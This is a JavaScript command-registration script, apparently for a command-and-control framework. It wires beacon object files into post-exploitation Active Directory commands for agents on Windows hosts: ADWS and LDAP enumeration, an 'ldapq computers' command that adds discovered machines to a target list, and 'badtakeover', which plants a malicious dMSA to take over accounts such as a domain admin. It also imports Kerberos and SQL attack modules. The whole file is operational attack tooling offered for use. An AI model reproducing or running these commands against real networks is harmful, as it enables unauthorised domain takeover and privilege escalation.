var metadata = {
    name: "AD-BOF",
    description: "Active Directory Exploitation BOFs"
};


/// ADWSsearch


var cmd_adwssearch = ax.create_command("adwssearch", "Executes ADWS query", "adwssearch (objectClass=*) -attributes *,ntsecuritydescriptor --dc DC1");
cmd_adwssearch.addArgString("query", true);
cmd_adwssearch.addArgFlagString( "-a", "attributes", "Comma-separated attributes to retrieve (default: all attributes)", "");
cmd_adwssearch.addArgFlagString( "--dc", "dc", "Target domain controller (e.g., 'dc01.domain.local'). If omitted, auto-discovers DC.", "");
cmd_adwssearch.addArgFlagString( "--dn", "dn", "Custom base DN (e.g., 'DC=domain,DC=local'). If not specified, auto-derives from user context or target.", "");
cmd_adwssearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let query      = parsed_json["query"];
    let attributes = parsed_json["attributes"];
    let dc         = parsed_json["dc"];
    let dn         = parsed_json["dn"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [query, attributes, dc, dn]);
    let bof_path = ax.script_dir() + "_bin/adws_search." + ax.arch(id) + ".o";
    let message = "BOF implementation: adws search";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var cmd_badtakeover = ax.create_command("badtakeover", "BOF for performing account takeover using the BadSuccessor technique", "badtakeover \"OU=TestOU,DC=domain,DC=dom\" attacker_dmsa S-1-5-21-....-1104 \"CN=domainadmin,CN=Users,DC=domain,DC=dom\" domain.dom");
cmd_badtakeover.addArgString("ou",      true, "Target OU to write the malicious dMSA");
cmd_badtakeover.addArgString("account", true, "The name of the new dMSA to create");
cmd_badtakeover.addArgString("sid",     true, "The Security ID (SID) of your current context");
cmd_badtakeover.addArgString("dn",      true, "The target user objects DN");
cmd_badtakeover.addArgString("domain",  true, "The current domain");
cmd_badtakeover.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let ou      = parsed_json["ou"];
    let account = parsed_json["account"];
    let sid     = parsed_json["sid"];
    let dn      = parsed_json["dn"];
    let domain  = parsed_json["domain"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [ou, account, sid, dn, domain]);
    let bof_path = ax.script_dir() + "_bin/badtakeover." + ax.arch(id) + ".o";
    let message = "Exploiting BadSuccessor...";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});




/// LDAPsearch


var cmd_ldapsearch = ax.create_command("ldapsearch", "Executes LDAP query", "ldapsearch (objectClass=*) -a *,ntsecuritydescriptor -c 40 -s 2 --dc DC1");
cmd_ldapsearch.addArgString("query", true);
cmd_ldapsearch.addArgFlagString( "-a", "attributes", "The attributes to retrieve", "*");
cmd_ldapsearch.addArgFlagInt( "-c", "count", "The result max size", 0);
cmd_ldapsearch.addArgFlagInt( "-s", "scope", "The scope to use: 1 = BASE, 2 = LEVEL, 3 = SUBTREE", 3);
cmd_ldapsearch.addArgFlagString( "--dc", "dc", "Hostname or IP to perform the LDAP connection on", "");
cmd_ldapsearch.addArgFlagString( "--dn", "dn", "The LDAP query basee", "");
cmd_ldapsearch.addArgBool( "--ldaps", "Using of LDAPS");
cmd_ldapsearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let query      = parsed_json["query"];
    let attributes = parsed_json["attributes"];
    let count      = parsed_json["count"];
    let scope      = parsed_json["scope"];
    let dc         = parsed_json["dc"];
    let dn         = parsed_json["dn"];
    let ldaps = 0;

    if (parsed_json["--ldaps"]) { ldaps = 1; }

    let bof_params = ax.bof_pack("wstr,cstr,int,int,cstr,cstr,int", [query, attributes, count, scope, dc, dn, ldaps]);
    let bof_path = ax.script_dir() + "_bin/ldapsearch." + ax.arch(id) + ".o";
    let message = "BOF implementation: ldapsearch";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var _cmd_ldapq_computers = ax.create_command("computers", "Get list of computers from ldap", "ldapq computers");
_cmd_ldapq_computers.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {

    let hook = function (task)
    {
        var blocks = task.text.split("--------------------");
        var arr = [];

        for (var i = 0; i < blocks.length; i++) {
            var block = blocks[i].trim();
            if (block.length === 0 || block.indexOf("cn:") === -1) continue;

            var lines = block.split("\n");
            var obj = {};
            for (var j = 0; j < lines.length; j++) {
                var line = lines[j].trim();
                if (line.length === 0) continue;
                var parts = line.split(":");
                var key = parts[0].trim();
                var value = parts.slice(1).join(":").trim();
                if (key === "cn") obj.computer = value;
                else if (key === "dNSHostName") obj.domain = value.split(".").slice(1).join(".");
                else if (key === "operatingSystem") {
                    obj.os_desc = value;
                    if (value.toLowerCase().indexOf("windows") !== -1)    obj.os = "windows";
                    else if (value.toLowerCase().indexOf("linux") !== -1) obj.os = "linux";
                    else if (value.toLowerCase().indexOf("mac") !== -1)   obj.os = "macos";
                    else obj.os = "unknown";
                }
                else if (key === "userAccountControl") {
                    var uac = parseInt(value, 10);
                    if ((uac & 2) === 0) continue;
                }
            }
            obj.alive = true;
            obj.tag = "";
            obj.info = "collected from ldap";

            arr.push(obj);
        }
        if(arr.length > 0)  ax.targets_add_list(arr);

        return task;
    }

    let bof_params = ax.bof_pack("wstr,cstr,int,int,cstr,cstr,int", ["(objectclass=computer)", "cn,operatingSystem,userAccountControl,dNSHostName", 0, 3, "", "", 0]);
    let bof_path = ax.script_dir() + "_bin/ldapsearch." + ax.arch(id) + ".o";
    let message = "BOF ldapsearch: query computers";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message, hook);
});

var cmd_ldapq = ax.create_command("ldapq", "Ldap query objects", "ldapq computers");
cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);



var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_ldapsearch, cmd_ldapq]);
ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);



ax.script_import(ax.script_dir() + "Kerbeus-BOF/kerbeus.axs")
ax.script_import(ax.script_dir() + "SQL-BOF/SQL.axs")
